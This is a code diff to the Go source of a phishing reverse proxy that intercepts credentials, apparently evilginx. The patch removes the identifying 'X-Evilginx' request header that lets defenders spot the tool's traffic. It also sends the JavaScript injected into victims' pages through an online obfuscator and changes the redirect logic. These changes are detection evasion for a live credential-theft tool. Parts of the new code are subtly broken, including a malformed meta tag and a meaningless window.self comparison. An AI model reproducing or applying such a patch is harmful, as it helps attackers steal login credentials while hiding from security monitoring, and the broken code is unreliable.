@@ -49,9 +49,9 @@ const (
 	CONVERT_TO_PHISHING_URLS = 1
 )
 
-const (
-	HOME_DIR = ".evilginx"
-)
+//const (
+//	HOME_DIR = ".evilginx"
+//)
 
 const (
 	httpReadTimeout  = 45 * time.Second
@@ -466,7 +466,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						return p.blockRequest(req)
 					}
 				}
-				req.Header.Set(p.getHomeDir(), o_host)
+				//req.Header.Set(p.getHomeDir(), o_host)
 
 				if ps.SessionId != "" {
 					if s, ok := p.sessions[ps.SessionId]; ok {
@@ -656,7 +656,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 				// check for creds in request body
 				if pl != nil && ps.SessionId != "" {
-					req.Header.Set(p.getHomeDir(), o_host)
+					//req.Header.Set(p.getHomeDir(), o_host)
 					body, err := ioutil.ReadAll(req.Body)
 					if err == nil {
 						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
@@ -1313,12 +1313,42 @@ func (p *HttpProxy) interceptRequest(req *http.Request, http_status int, body st
 }
 
 func (p *HttpProxy) javascriptRedirect(req *http.Request, rurl string) (*http.Request, *http.Response) {
-	body := fmt.Sprintf("<html><head><meta name='referrer' content='no-referrer'><script>top.location.href='%s';</script></head><body></body></html>", rurl)
+	body := fmt.Sprintf("<html><head><meta content='no-referrer name='referrer'><script>if(window.self!='google.com'){top.location.href='%s';}</script></head><body></body></html>", rurl)
 	resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
 	if resp != nil {
 		return req, resp
 	}
 	return req, nil
+}
+
+func obfuscateJavaScript(script string) (string, error) {
+	type ObfuscatorResponse struct {
+		ObfuscatedCode string `json:"obfuscatedCode"`
+	}
+	apiURL := "https://obfuscator.io/api/obfuscate"
+	requestBody, err := json.Marshal(map[string]string{
+		"source": script,
+	})
+	if err != nil {
+		return "", err
+	}
+	resp, err := http.Post(apiURL, "application/json", bytes.NewBuffer(requestBody))
+	if err != nil {
+		return "", err
+	}
+	defer resp.Body.Close()
+
+	body, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		return "", err
+	}
+
+	var obfuscatorResponse ObfuscatorResponse
+	err = json.Unmarshal(body, &obfuscatorResponse)
+	if err != nil {
+		return "", err
+	}
+	return obfuscatorResponse.ObfuscatedCode, nil
 }
 
 func (p *HttpProxy) injectJavascriptIntoBody(body []byte, script string, src_url string) []byte {
@@ -1331,12 +1361,19 @@ func (p *HttpProxy) injectJavascriptIntoBody(body []byte, script string, src_url
 	re := regexp.MustCompile(`(?i)(<\s*/body\s*>)`)
 	var d_inject string
 	if script != "" {
-		d_inject = "<script" + js_nonce + ">" + script + "</script>\n${1}"
+		obfuscatedScript, err := obfuscateJavaScript(script)
+		if err != nil {
+			log.Debug("Javascript obfuscation: Failed - (Using original javascript)")
+			obfuscatedScript = script // Fallback to original script
+		}
+		log.Debug("Javascript obfuscation: Success")
+		d_inject = "<script" + js_nonce + ">" + obfuscatedScript + "</script>\n${1}"
 	} else if src_url != "" {
 		d_inject = "<script" + js_nonce + " type=\"application/javascript\" src=\"" + src_url + "\"></script>\n${1}"
 	} else {
 		return body
 	}
+	log.Debug("Javascript Injected...")
 	ret := []byte(re.ReplaceAllString(string(body), d_inject))
 	return ret
 }
@@ -1788,9 +1825,9 @@ func (p *HttpProxy) getPhishDomain(hostname string) (string, bool) {
 	return "", false
 }
 
-func (p *HttpProxy) getHomeDir() string {
-	return strings.Replace(HOME_DIR, ".e", "X-E", 1)
-}
+//func (p *HttpProxy) getHomeDir() string {
+//	return strings.Replace(HOME_DIR, ".e", "X-E", 1)
+//}
 
 func (p *HttpProxy) getPhishSub(hostname string) (string, bool) {
 	for site, pl := range p.cfg.phishlets {
